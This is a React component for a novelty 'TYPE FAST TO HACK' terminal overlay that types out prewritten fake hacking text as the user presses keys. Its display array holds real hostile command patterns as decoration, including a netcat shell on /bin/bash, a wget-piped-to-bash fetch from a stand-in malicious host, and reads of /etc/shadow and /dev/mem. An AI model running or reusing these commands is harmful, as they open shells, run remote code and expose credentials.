import React, { useEffect, useState, useRef } from "react";

const fakeCodeSnippets = [
    "#include <stdio.h>",
    "#include <stdlib.h>",
    "int main() {",
    '    printf("Initializing backdoor access...\\n");',
    '    system("sudo echo 1 > /proc/sys/kernel/sysrq");',
    "    return 0;",
    "}",
    "echo '[+] Establishing SSH connection...'",
    "ssh -o StrictHostKeyChecking=no root@192.168.1.100",
    "nc -lvp 4444 -e /bin/bash",
    "iptables -A INPUT -p tcp --dport 22 -j DROP",
    "echo '[!] Encrypting payload...'",
    "mov eax, 0x5A",
    "xor ebx, ebx",
    "int 0x80",
    "jmp 0x08048534",
    "cat /etc/shadow | grep root",
    "chmod 777 /usr/bin/sudo",
    "wget -qO- http://malicious.site/payload.sh | bash",
    "echo '[+] Dumping memory contents...'",
    "strings /dev/mem | grep password",
    "su root",
    "[KERNEL] Loading module: exploit.ko",
    "[KERNEL] Overwriting sys_call_table...",
    "[!] Segmentation fault at 0x00007fff...",
    "[+] Writing shellcode to process memory...",
];

const HackerTerminal = ({ onClose }) => {
  const [logs, setLogs] = useState([]);
  const [currentLine, setCurrentLine] = useState("root@server:~$ ");
  const [currentSnippet, setCurrentSnippet] = useState(fakeCodeSnippets[0]);
  const [charIndex, setCharIndex] = useState(0);
  const [snippetIndex, setSnippetIndex] = useState(0);
  const inputRef = useRef(null);
  const terminalRef = useRef(null);
  const MAX_LINES = 25; // Maximum number of lines to keep visible

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [logs, currentLine]);

  useEffect(() => {
    inputRef.current.focus();
  }, []);

  const handleInput = (e) => {
    e.preventDefault();

    if (charIndex < currentSnippet.length) {
      const nextChunkSize = Math.floor(Math.random() * 3) + 2;
      const nextChunk = currentSnippet.slice(charIndex, charIndex + nextChunkSize);

      setCurrentLine((prev) => prev + nextChunk);
      setCharIndex((prev) => prev + nextChunkSize);
    } else {
      setLogs((prevLogs) => {
        const newLogs = [...prevLogs, currentLine];
        // Keep only the most recent lines to prevent overflow
        if (newLogs.length > MAX_LINES) {
          return newLogs.slice(-MAX_LINES);
        }
        return newLogs;
      });
      setCurrentLine("");

      const nextSnippetIndex = (snippetIndex + 1) % fakeCodeSnippets.length;
      setCurrentSnippet(fakeCodeSnippets[nextSnippetIndex]);
      setSnippetIndex(nextSnippetIndex);
      setCharIndex(0);
    }
  };

  return (
    <div style={{
      position: 'fixed',
      top: 0,
      left: 0,
      width: '100vw',
      height: '100vh',
      background: 'rgba(0,0,0,0.25)',
      zIndex: 1000,
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
    }}>
      <div style={{
        position: 'relative',
        background: 'black',
        borderRadius: 16,
        boxShadow: '0 8px 32px 0 rgba(31,38,135,0.37)',
        padding: 0,
        width: 800,
        height: 600,
        minWidth: 0,
        minHeight: 0,
        maxWidth: '95vw',
        maxHeight: '95vh',
        overflow: 'hidden',
        border: '2px solid #00ff00',
        display: 'flex',
        flexDirection: 'column',
      }}>
        {/* Header with close button */}
        <div style={{
          backgroundColor: "black",
          color: "limegreen",
          fontFamily: "monospace",
          padding: "10px 20px",
          textAlign: "center",
          fontSize: "18px",
          fontWeight: "bold",
          borderRadius: "14px 14px 0 0",
          border: "none",
          borderBottom: "1px solid limegreen",
          boxShadow: "0 0 10px limegreen",
          boxSizing: "border-box",
          position: 'relative',
        }}>
          TYPE FAST TO HACK
          <button
            onClick={onClose}
            style={{
              position: 'absolute',
              top: 8,
              right: 8,
              background: 'rgba(255,0,0,0.8)',
              color: '#fff',
              border: 'none',
              borderRadius: 6,
              padding: '4px 10px',
              fontSize: 18,
              cursor: 'pointer',
              zIndex: 10,
            }}
            aria-label="Close Hacker Terminal"
          >✕</button>
        </div>

        {/* Terminal content */}
        <div
          style={{
            backgroundColor: "black",
            color: "limegreen",
            fontFamily: "monospace",
            padding: "20px",
            flex: 1,
            width: "100%",
            overflowY: "auto",
            overflowX: "auto",
            whiteSpace: "pre",
            borderRadius: "0 0 14px 14px",
            border: "none",
            boxShadow: "0 0 10px limegreen",
            position: "relative",
            textAlign: "left",
            boxSizing: "border-box",
          }}
          ref={terminalRef}
          onClick={() => inputRef.current.focus()}
        >
          {logs.map((log, index) => (
            <div key={index} style={{ textAlign: "left", lineHeight: "1.2" }}>{log}</div>
          ))}
          <div style={{ textAlign: "left", lineHeight: "1.2" }}>{currentLine}<span style={{ animation: "blink 1s infinite" }}>_</span></div>

          <input
            ref={inputRef}
            type="text"
            onKeyDown={handleInput}
            style={{
              position: "absolute",
              opacity: 0,
              width: "100%",
              height: "100%",
              top: 0,
              left: 0,
              border: "none",
              outline: "none",
            }}
          />

          <style jsx>{`
            @keyframes blink {
              0%, 50% { opacity: 1; }
              51%, 100% { opacity: 0; }
            }
          `}</style>
        </div>
      </div>
    </div>
  );
};

export default HackerTerminal;